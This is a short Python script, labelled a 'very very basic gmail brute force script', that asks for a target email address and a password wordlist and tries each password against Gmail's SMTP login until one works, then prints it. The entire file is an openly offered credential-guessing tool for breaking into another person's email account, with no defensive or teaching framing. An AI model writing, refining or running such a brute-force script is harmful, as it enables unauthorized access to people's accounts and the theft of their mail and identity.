#!/usr/bin/python


#very very basic gmail brute force script

import smtplib
from termcolor import colored

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter the target email address: ")
passwdfile = input("Enter the password file: ")
file = open(passwdfile, "r")

for password in file:
    password = password.strip("\n")
    try:
        smtpserver.login(user, password)
        print(colored("[+] Password Found: %s " % password, 'green'))
        break
    except smtplib.SMTPAuthenticationError:
        print(colored("Wrong Password: "+ password, 'red'))
        
        
       
 
